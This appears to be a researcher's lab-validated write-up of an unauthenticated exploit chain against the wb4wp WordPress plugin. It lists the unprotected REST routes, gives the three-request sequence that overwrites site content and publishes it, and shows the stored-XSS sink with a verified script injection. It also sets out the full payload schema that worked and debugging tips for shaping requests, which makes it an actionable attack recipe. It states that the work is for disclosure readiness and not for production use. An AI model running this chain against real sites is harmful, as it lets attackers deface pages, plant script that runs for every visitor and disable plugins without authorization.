# wb4wp v1.0-2781 Full Unauth Exploit Chain — Lab-Validated 2026-09-17

Complete attacker chain proven end-to-end on the local Kali lab against the exact
production zip (`wp-versions.builderservices.io/content/bluehost-version.json` →
`wb4wp-wordpress-plugin-bluehost-production.zip`). Companion to
`wp-plugin-lab-validation.md` (setup pipeline) and
`conditional-rest-route-registration-pattern.md` (route semantics).

## Confirmed live-unauth routes (requires_admin=false + no perm callback)

| Route | Handler effect |
|---|---|
| `POST /wp-json/wb4wp/v1/save_site` | Overwrites site model: pages, `page_on_front`, `blogname`, theme options, navigation, `wb4wp_api_keys` option; `remove_filter('content_save_pre','wp_filter_post_kses')` allows arbitrary HTML into post_content; `mkdir(0777)` + `file_put_contents` JSON to `wp-content/uploads/wb4wp-page-assets/assets_{post_id}.json` |
| `POST /posts/{id}/publish_autosave` | `wp_restore_post_revision($autosave->ID)` — publishes the attacker-controlled WB4WP_DRAFT revision. 200 with redirect_url |
| `POST /posts/{id}/discard_autosave` | Deletes autosave |
| `POST /disable-plugin` | `deactivate_plugins(WB4WP_PLUGIN_FILE)`; also `switch_theme()` when wb4wp theme active |
| `GET /wp_posts` (also `/wp_posts/{id}`) | Full post content/title/status leak (posts visible to anon) |
| `GET /wc_products` (+`/{id}`) | Same leak shape when WooCommerce active |
| `GET /ping`, `GET /settings` | Benign |

NOT unauth (requires_admin defaults true → skipped at registration →
`rest_no_route` 404 for anon, despite dangerous handlers): `/drafts`,
`/description` (would leak `apiKeys` option), `/sso` (SSO JWT), `/provision`,
`/publish`, `/plugin-state`, `/start_onboarding`, `/delete_onboarding_id`,
`/set_creative_mail_referrer`. Route arrays alone mislead in BOTH directions —
live-verify via `GET /wp-json/` + OPTIONS probe.

Routes WITH explicit perm callbacks (correctly 401): `/token` (handshake token,
GUID entropy unverified), `/images`, `/fetch-stats`, `/callback`, `/contacts`,
`/dont-show-unpublished-changes-modal-again`.

## The complete chain (3 unauth requests)

1. **Map the target EE page to a PUBLISHED wp page.** `save_site` only reaches the
   autosave branch (`store_auto_save`) when
   `get_express_editor_page_id_to_wp_page_id_mapping()` finds
   `postmeta.WB4WP_PAGE_ID` = the EE page id on a post with `post_status='publish'`
   and `_wp_page_template='wb4wp-template.php'`. On a live wb4wp site this
   already exists; on a fresh lab, insert it:
   `INSERT INTO wp_postmeta VALUES (7,'WB4WP_PAGE_ID','pg9'),(7,'WB4WP_EDIT_MODE','builder'),(7,'_wp_page_template','wb4wp-template.php')`
2. **`POST /save_site`** with `site_description.pages[].id='pg9'` (published-page
   entry) + `published_pages.pages[]` carrying attacker `featureScript`/
   `baseStyle`/section `html`. Handler writes revision with `WB4WP_DRAFT=1`,
   `WB4WP_PAGE_SECTIONS`, page uri, and `assets_{wp_id}.json` containing the raw
   `featureScript`. Must include a `mainPage:true` page in `site_description.pages`
   or `map_site_model_to_theme_options` derefs `current($main_pages)` = false →
   500 at class-site-model-helper.php:201.
3. **`POST /posts/{wp_id}/publish_autosave`** → revision restored over the live page.

## Stored-XSS sink (Template_Manager::output_essential_scripts_and_json_objects_used_by_express_editor_runtime)

```php
echo "<style type='text/css'>" . $assets->baseStyle . '</style>';
...
echo '<script>' . $assets->featureScript . '</script>';
```

Reads `uploads/wb4wp-page-assets/assets_{post_id}.json` (which `/save_site` writes
attacker-controlled), echoes raw into the page for every visitor. Verified on
`GET /job-openings`:

```
window._permaLinkStructure="/%postname%/";</script>
<script><script>alert(document.domain)</script></script>
```

Also saved as `wb4wp_feature_script` postmeta — the meta is the durable payload,
the uploads JSON is the render-time source.

## Payload schema that worked (minimal)

- `site_description.pages[]`: `{id, title, uriPath, mainPage, showInNavigation, sections:[{id,html,css}], headerSection:{layout:{section:{id}},binding:{_toggle:{...}}}, description, matchUriToTitle}`
- `site_description.globalSections`: `{header:sec(), footer:sec()}` where sec = `{layout:{section:{id}}, binding:{_toggle:{...}, description:'', subtitle:'', pagesMenu:[], background:{colorIndex:0,img:{sizes:{}},video:'',opacity:0,effect:'',patternIndex:0}}}`
- `site_description.theme.fonts`: `{fontSize:"1", body:{name,weight}, heading:{name,weight}}` (objects here; `"Name:weight"` strings in `published_pages.theme.fonts` — inconsistent shapes, feed both)
- `site_description.theme.colors`: `{background:[r,g,b], text:[r,g,b], accent:[[r,g,b],[r,g,b]]}` (accent is nested pairs; scalar ints crash `colors_to_hex`)
- `site_description.navigation[]`: `{id, pageId, parentId:0, order, menuItem:{title, showInNavigation:true}}`
- `globalBinding`: `{title, description, accounts:{}, address:{}, logo:{}, menuData:[], openingHours:{}, translations:{ada:{skipToMainText}}}`
- `published_pages`: `{theme:{fonts:"Name:weight|Name:weight", baseStyle:"body{}"}, pages:[{pageId, colors, uriPath, baseStyle, mainPage, featureScript, siteModel:{theme:{fonts:{body:{name,weight},heading:{name,weight}}}}, sections:[{html, css, cssVariables:{}, id, template}]}]}`
- top-level: `{site_id, site_name, site_description, published_pages, leading_indicators:{}}`

## Debugging the shape (dev-mode oracle)

With `.env` `WB4WP_ENVIRONMENT=development` (see wp-plugin-lab-validation.md §3),
each 500 names the next missing key. Observed sequence on save_site:
`count(): not Countable` (navigation wrong type) → `Undefined array key "footer"`
→ `"layout"` → `"weight"` (fonts object shape) → `"siteModel"` → `""` (provider)
→ 200. PATCH the plugin copy's `Api_Manager::api_error()` to append
`$errfile` + `debug_backtrace()[1]['line']` to the message — turns the oracle
into a file:line tracer. Remove the tracing mu-plugin (`98-trace.php`) before
final renders: its `error_log` failures emit `<b>Warning</b>` text that pollutes
page output and breaks content checks.

## Impact boundaries / cleanup

- `save_site` writes `wb4wp_api_keys` (API_KEYS const), NOT
  `wb4wp_instance_api_key` — so it does NOT unlock `/images` or `/token`
  (those validate the instance api key / handshake token).
- Cleanup: `wp post delete {draft_id} --force`, delete `wb4wp_api_keys` option,
  remove injected `WB4WP_*` postmeta from the overwritten post, delete
  `uploads/wb4wp-page-assets/assets_*.json`, re-activate plugin after
  `/disable-plugin` tests.
- No public Bluehost bug-bounty program exists (no security.txt, no VDP) —
  validated for disclosure-readiness only; do not fire at production.
